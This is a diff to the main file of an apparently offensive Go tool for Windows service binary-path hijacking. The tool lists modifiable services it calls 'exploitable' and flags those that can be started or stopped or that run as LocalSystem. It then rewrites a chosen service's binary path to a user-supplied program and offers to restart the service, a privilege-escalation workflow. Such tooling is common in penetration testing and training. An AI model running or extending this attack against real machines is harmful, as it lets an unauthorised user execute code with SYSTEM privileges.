@@ -2,6 +2,7 @@ package main
 
 import (
 	"fmt"
+	"strings"
 
 	"os"
 
@@ -11,7 +12,7 @@ import (
 
 func main() {
 	// Setting up all variables we need
-	// variables to hold user input
+	// variables to hold user input,
 	// slice to hold user options and the
 	// user homedir
 
@@ -25,6 +26,7 @@ func main() {
 	// choice of services that are exploitable to the user.
 	var userOptions []*enumwin.WeakServ
 
+	// Pointer to our menu colour struct
 	m := enumwin.SetMenu()
 
 	text, err := os.ReadFile(homeDir + `\win-binary-hijacking\internal\banner\banner.txt`)
@@ -52,7 +54,21 @@ func main() {
 		// as well as their index to provide menu of
 		// options for the user
 		for index, val := range userOptions {
-			m.CD.Printf("%d: %s\n", index+1, val.Name)
+			formatOption := m.CD.Sprintf("%d: %s", index+1, val.Name)
+
+			if val.CanStart {
+				formatOption += m.CG.Sprintf(" CAN START")
+			}
+
+			if val.CanStop {
+				formatOption += m.CG.Sprintf(" CAN STOP")
+			}
+
+			if strings.ToLower(val.StartName) == "localsystem" {
+				formatOption += m.CG.Sprintf(" STARTS AS LocalSystem")
+			}
+
+			fmt.Println(formatOption)
 		}
 
 		m.CT.Println("\n\nChoose a service to modify:")
@@ -82,7 +98,48 @@ func main() {
 			r, err = fmt.Scanln(&binaryChoice)
 		}
 
-		enumwin.ChangeBinPath(userOptions[userChoice-1], binaryChoice)
+		ws := enumwin.ChangeBinPath(userOptions[userChoice-1], binaryChoice)
+
+		if ws.CanStart && ws.CanStop {
+			var startChoice string
+			m.CD.Println("Can Start/Stop Service...")
+			m.CD.Println("Restart Service? [y/n]")
+			r, err := fmt.Scanln(&startChoice)
+
+			startChoice = strings.ToLower(startChoice)
+
+			for r != 1 || err != nil {
+				r, err = fmt.Scanln(&startChoice)
+
+				startChoice = strings.ToLower(startChoice)
+			}
+
+			switch startChoice {
+			case "y":
+				err := enumwin.StopServ(ws)
+
+				if err != nil {
+					m.CD.Println("Error Stopping service.")
+				}
+
+				err = enumwin.StartServ(ws)
+
+				if err != nil {
+					m.CD.Println("Error Starting service")
+				}
+
+				m.CG.Println("Service started succesfully")
+
+			case "n":
+				m.CD.Println("Exiting")
+				os.Exit(1)
+			default:
+				m.CD.Println("Bad Input")
+			}
+
+		} else {
+			m.CD.Println("You don't seem to have appropiate permissions to start/restart service.")
+		}
 
 	} else {
 		m.CT.Println("No services found which you can modify")
